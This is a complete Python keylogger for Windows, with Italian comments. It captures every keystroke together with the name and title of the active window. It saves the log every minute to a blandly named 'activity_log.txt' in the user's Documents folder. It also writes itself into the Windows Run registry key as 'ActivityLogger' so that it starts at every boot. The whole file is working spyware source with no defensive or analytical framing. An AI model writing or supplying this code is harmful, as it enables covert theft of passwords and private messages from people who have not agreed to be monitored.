import os
import datetime
import keyboard
import win32gui
import win32process
import psutil
import sys
import winreg as reg
from threading import Timer

# Configurazione
OUTPUT_FILE = os.path.join(os.path.expanduser("~"), "Documents", "activity_log.txt")
UPDATE_INTERVAL = 60  # Salva nel file ogni 60 secondi


class KeyLogger:
    def __init__(self, output_file):
        self.log = ""
        self.output_file = output_file
        self.current_window = ""
        # Assicurati che la directory esista
        os.makedirs(os.path.dirname(output_file), exist_ok=True)

    def callback(self, event):
        """Callback che viene chiamato ad ogni pressione di tasto"""
        name = event.name

        # Ignora i tasti speciali
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                name = "[BACKSPACE]"
            else:
                name = f"[{name.upper()}]"

        # Ottieni informazione sulla finestra attuale
        window = self.get_current_window()
        if window != self.current_window:
            self.current_window = window
            self.log += f"\n\n[{datetime.datetime.now()}] Finestra: {window}\n"

        # Aggiungi il tasto al log
        self.log += name

    def get_current_window(self):
        """Ottiene il nome della finestra e dell'applicazione attualmente attive"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                window_title = win32gui.GetWindowText(hwnd)
                return f"{process_name} - {window_title}"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                return "Sconosciuto"
        except:
            return "Sconosciuto"

    def update_file(self):
        """Aggiorna il file di log e pianifica il prossimo aggiornamento"""
        if self.log:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(self.log)
            self.log = ""

        # Pianifica il prossimo aggiornamento
        timer = Timer(UPDATE_INTERVAL, self.update_file)
        timer.daemon = True
        timer.start()

    def start(self):
        """Avvia il keylogger"""
        self.log += f"\n\n=== INIZIO SESSIONE {datetime.datetime.now()} ===\n\n"

        # Avvia l'aggiornamento periodico del file
        self.update_file()

        # Avvia l'ascolto degli eventi tastiera
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


def add_to_startup():
    """Aggiunge il programma all'avvio automatico di Windows"""
    try:
        # Percorso del file eseguibile (se compilato con PyInstaller)
        exe_path = sys.executable

        # Se è in modalità script, punta al file py
        if exe_path.endswith("python.exe"):
            exe_path = f'"{exe_path}" "{os.path.abspath(__file__)}"'

        # Apri la chiave di registro di avvio
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        # Apri la chiave con permessi di scrittura
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)

        # Imposta il valore della chiave
        reg.SetValueEx(reg_key, "ActivityLogger", 0, reg.REG_SZ, exe_path)

        # Chiudi la chiave
        reg.CloseKey(reg_key)
        return True
    except Exception as e:
        print(f"Errore nell'aggiunta all'avvio: {e}")
        return False


if __name__ == "__main__":
    # Aggiungi il programma all'avvio automatico
    add_to_startup()

    # Avvia il keylogger
    keylogger = KeyLogger(OUTPUT_FILE)
    keylogger.start()
